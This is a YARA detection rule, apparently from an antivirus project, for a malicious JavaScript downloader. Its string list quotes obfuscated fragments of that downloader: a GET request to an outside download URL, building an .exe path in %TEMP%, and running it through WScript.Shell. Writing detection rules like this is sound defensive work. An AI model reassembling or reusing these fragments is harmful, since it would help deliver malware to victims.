rule sig_20160328_ece9426daea065c4a641eecbb2b0842d {
  meta:
    description = "datamaliciousorder - file 20160328_ece9426daea065c4a641eecbb2b0842d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ae24b1ef2a34cc7f3164bbb1653da485e0e40189f76746d6156a8d2caca59f8a"

  strings:
    $s1  = "function Mcxgucljho() {return Thnht[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZvPjeJKu0v7.exe\";};" fullword ascii
    $s2  = "Owucderop[Yzxep](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Inuxxidv](Msrznkvxk() * 11)} while (Owucderop[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Fywrv(Mbwix, Fbfiwuue){return Mbwix - Fbfiwuue;};" fullword ascii
    $s5  = "var Thnht = function Jdhmi() {return WScript[Inaiaoho](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Khxilqo(Dwronjdul){Thnht[\"Run\"](Dwronjdul, Whgcyt, Whgcyt);};" fullword ascii
    $s7  = "function Vucsdwkml() {return ((Wbmqmftya == true) && (Wbmqmftya == Ytiijrmsmj)) ? 1 : Whgcyt;};" fullword ascii
    $s8  = "var Ydwbp = false;" fullword ascii
    $s9  = "Wbmqmftya = true; " fullword ascii
    $s10 = "Ytiijrmsmj = true; " fullword ascii
    $s11 = "return Fywrv(Cqpicbpzd, Yyjkr);" fullword ascii
    $s12 = "function Klwyieo(){return Dvrbkjfzwc;};" fullword ascii
    $s13 = "function Usbnohddsr(){return Inaiaoho;};" fullword ascii
    $s14 = "var Ytiijrmsmj = false;" fullword ascii
    $s15 = "var Wbmqmftya = false;" fullword ascii
    $s16 = "function Ahxdouj()" fullword ascii
    $s17 = "var Kbpkjsfkth = new this[\"Date\"]();" fullword ascii
    $s18 = " while (Fogvbslwwx){" fullword ascii
    $s19 = "function Msrznkvxk(){return 22;};" fullword ascii
    $s20 = "function Tozymnemmf(Cufmexuja) {var Hxrfqen = (1, 2, 3, 4, 5, Cufmexuja); return Hxrfqen;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}